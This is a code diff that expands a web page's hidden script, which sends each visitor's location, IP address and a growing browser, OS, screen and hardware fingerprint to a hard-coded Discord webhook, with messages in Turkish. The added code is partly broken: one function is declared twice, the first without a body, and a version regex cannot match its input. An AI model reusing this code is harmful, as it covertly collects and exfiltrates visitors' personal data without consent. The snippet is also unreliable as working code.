@@ -29,11 +29,24 @@
               const platform = navigator.platform;
               const language = navigator.language;
               const browserName = getBrowserName(userAgent);
+              const browserVersion = getBrowserVersion(userAgent);
+              const osName = getOSName(platform);
+              const osVersion = getOSVersion(platform);
+              const deviceType = getDeviceType(userAgent);
+              const screenWidth = screen.width;
+              const screenHeight = screen.height;
+              const screenColorDepth = screen.colorDepth;
+              const screenOrientation = screen.orientation;
+
+              // Get the device information
+              const deviceMemory = navigator.deviceMemory;
+              const deviceHardwareConcurrency = navigator.hardwareConcurrency;
+              const deviceCpuArchitecture = getCPUArchitecture(userAgent);
 
               // Send the user's location, IP address, website information, and system information to the Discord webhook
               const webhookUrl = 'https://discord.com/api/webhooks/1246133942344617984/L5BhAqPdku8Q8qR5-DJO5senhebGe2UMdVCsxEzb7cj_pYXBOsG43i1eZzPSk15KrHJD';
               const formData = new FormData();
-              formData.append('content', `Siteye Girildi: ${lat}, ${lon} - IP Adresi: ${ip} - Website: ${websiteUrl} - Başlık: ${websiteTitle} - Sistem Bilgisi: ${browserName} ${platform} ${language}`);
+              formData.append('content', `Siteye Girildi: ${lat}, ${lon} - IP Adresi: ${ip} - Website: ${websiteUrl} - Başlık: ${websiteTitle} - Sistem Bilgisi: ${browserName} ${browserVersion} - İşletim Sistemi: ${osName} ${osVersion} - Cihaz Bilgisi: ${deviceType} - Ekran Bilgisi: ${screenWidth}x${screenHeight} - Renk Derinliği: ${screenColorDepth} - Ekran Yönü: ${screenOrientation} - Cihaz Belleği: ${deviceMemory} - Cihaz Çekirdek Sayısı: ${deviceHardwareConcurrency} - Cihaz CPU Mimarisi: ${deviceCpuArchitecture}`);
 
               fetch(webhookUrl, {
                 method: 'POST',
@@ -55,6 +68,46 @@
         if (userAgent.indexOf('Firefox') > -1) return 'Mozilla Firefox';
         if (userAgent.indexOf('Safari') > -1) return 'Apple Safari';
         if (userAgent.indexOf('Edge') > -1) return 'Microsoft Edge';
+        return 'Unknown';
+      }
+
+      // Function to get the browser version from the user agent
+      function getBrowserVersion(userAgent) {
+        const browserVersionRegex = /\b(?:Chrome|Firefox|Safari|Edge)\/([\w.]+)\b/;
+        const match = userAgent.match(browserVersionRegex);
+        return match ? match[1] : 'Unknown';
+      }
+
+      // Function to get the OS name from the platform
+      function getOSName(platform) {
+        if (platform.indexOf('Win') > -1) return 'Windows';
+        if (platform.indexOf('Mac') > -1) return 'macOS';
+        if (platform.indexOf('Linux') > -1) return 'Linux';
+        return 'Unknown';
+      }
+
+      // Function to get the OS version from the platform
+      function getOSVersion(platform) {
+        const osVersionRegex = /\b(?:Windows|macOS|Linux) ([\w.]+)\b/;
+        const match = platform.match(osVersionRegex);
+        return match ? match[1] : 'Unknown';
+      }
+
+      // Function to get the device type from the user agent
+      function getDeviceType(userAgent)
+            // Function to get the device type from the user agent
+      function getDeviceType(userAgent) {
+        if (userAgent.indexOf('Mobile') > -1) return 'Mobile';
+        if (userAgent.indexOf('Tablet') > -1) return 'Tablet';
+        if (userAgent.indexOf('Desktop') > -1) return 'Desktop';
+        return 'Unknown';
+      }
+
+      // Function to get the CPU architecture from the user agent
+      function getCPUArchitecture(userAgent) {
+        if (userAgent.indexOf('x86_64') > -1) return 'x86_64';
+        if (userAgent.indexOf('x86') > -1) return 'x86';
+        if (userAgent.indexOf('ARM') > -1) return 'ARM';
         return 'Unknown';
       }
     </script>
